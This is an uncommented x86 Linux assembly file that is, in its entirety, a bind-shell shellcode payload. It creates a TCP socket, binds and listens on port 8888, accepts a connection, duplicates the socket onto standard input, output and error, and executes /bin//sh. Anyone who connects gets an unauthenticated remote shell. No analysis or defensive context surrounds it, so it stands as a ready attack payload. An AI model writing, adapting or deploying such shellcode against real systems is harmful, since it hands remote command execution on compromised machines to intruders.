global _start			

section .text

_start:
	xor ebx,ebx 
	mul ebx 
	push ebx 
	inc ebx 
	push ebx 
	push byte +0x2
	mov ecx,esp 
	mov al,0x66 
	int 0x80 
	pop ebx 
	pop esi 
	push edx 
	push dword 0xb8220002
	push byte +0x10
	push ecx 
	push eax 
	mov ecx,esp 
	push byte +0x66
	pop eax 
	int 0x80 
	mov [ecx+0x4],eax 
	mov bl,0x4 
	mov al,0x66 
	int 0x80 
	inc ebx 
	mov al,0x66 
	int 0x80 
	xchg eax,ebx 
	pop ecx 
test:
	push byte +0x3f
	pop eax 
	int 0x80 
	dec ecx 
	jns test 
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov ebx,esp 
	push eax 
	push ebx 
	mov ecx,esp 
	mov al,0xb 
	int 0x80 